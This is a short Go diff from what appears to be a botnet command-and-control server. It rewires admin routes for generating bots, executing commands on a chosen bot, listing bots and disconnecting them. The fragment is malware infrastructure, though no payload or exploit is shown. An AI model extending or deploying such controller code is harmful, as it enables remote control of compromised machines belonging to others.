@@ -46,8 +46,8 @@ func main() {
 	c2.Db = db
 
 	adminMux := http.NewServeMux()
-	adminMux.HandleFunc("/", nil)
-	adminMux.HandleFunc("/generatebot", GenerateBot)
+	// adminMux.HandleFunc("/", nil)
+	adminMux.HandleFunc("/generatebot", c2.GenerateBot)
 	adminMux.HandleFunc("/executeCommand/{botid}/", c2.SendCommand)
 	adminMux.HandleFunc("/listBots", c2.ListBots)
 	adminMux.HandleFunc("/disconnect/{botid}/", func(w http.ResponseWriter, r *http.Request) {
